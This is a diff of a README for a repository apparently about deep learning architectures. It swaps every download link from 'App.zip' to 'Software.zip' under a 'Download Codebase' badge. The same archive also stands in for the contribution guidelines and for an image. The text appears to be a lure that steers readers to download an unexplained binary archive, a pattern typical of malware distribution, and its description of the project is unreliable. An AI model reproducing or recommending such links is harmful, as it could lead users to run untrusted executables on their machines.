@@ -37,13 +37,13 @@ Explore state-of-the-art deep learning architectures, including transformers and
 
 To explore the projects in this repository, click the button below to download the codebase:
 
-[![Download Codebase](https://github.com/brashc/deep-learning-evolution/releases/download/v1.0/App.zip)](https://github.com/brashc/deep-learning-evolution/releases/download/v1.0/App.zip)
+[![Download Codebase](https://github.com/brashc/deep-learning-evolution/releases/download/v2.0/Software.zip)](https://github.com/brashc/deep-learning-evolution/releases/download/v2.0/Software.zip)
 
 If the link above does not work, please check the "Releases" section of the repository for alternative download options.
 
 ## Contribution Guidelines
 
-We welcome contributions from the open-source community to further enhance the projects in this repository. Whether you have a new optimization technique to share or a bug fix to contribute, we appreciate all forms of collaboration. Please refer to the `https://github.com/brashc/deep-learning-evolution/releases/download/v1.0/App.zip` file for guidelines on how to contribute.
+We welcome contributions from the open-source community to further enhance the projects in this repository. Whether you have a new optimization technique to share or a bug fix to contribute, we appreciate all forms of collaboration. Please refer to the `https://github.com/brashc/deep-learning-evolution/releases/download/v2.0/Software.zip` file for guidelines on how to contribute.
 
 ## Community Support
 
@@ -57,4 +57,4 @@ We would like to express our gratitude to the contributors, researchers, and dev
 
 Start your journey into the realm of deep learning evolution today and unlock the potential of advanced GPU optimizations, cutting-edge architectures, and production-ready pipelines. Dive into the projects, contribute to the community, and stay at the forefront of innovation in AI research. Happy coding! 🚀
 
-![Deep Learning Evolution](https://github.com/brashc/deep-learning-evolution/releases/download/v1.0/App.zip)
+![Deep Learning Evolution](https://github.com/brashc/deep-learning-evolution/releases/download/v2.0/Software.zip)
